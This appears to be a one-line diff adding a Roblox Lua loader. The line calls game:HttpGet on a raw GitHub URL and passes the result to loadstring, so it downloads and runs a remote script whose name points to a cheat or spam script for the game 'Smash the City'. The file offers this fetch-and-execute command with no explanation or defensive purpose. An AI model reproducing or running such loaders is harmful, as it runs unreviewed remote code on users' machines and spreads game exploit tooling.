@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/upd-smash-the-city-spam6-xozunou7o9ollt.lua"))()
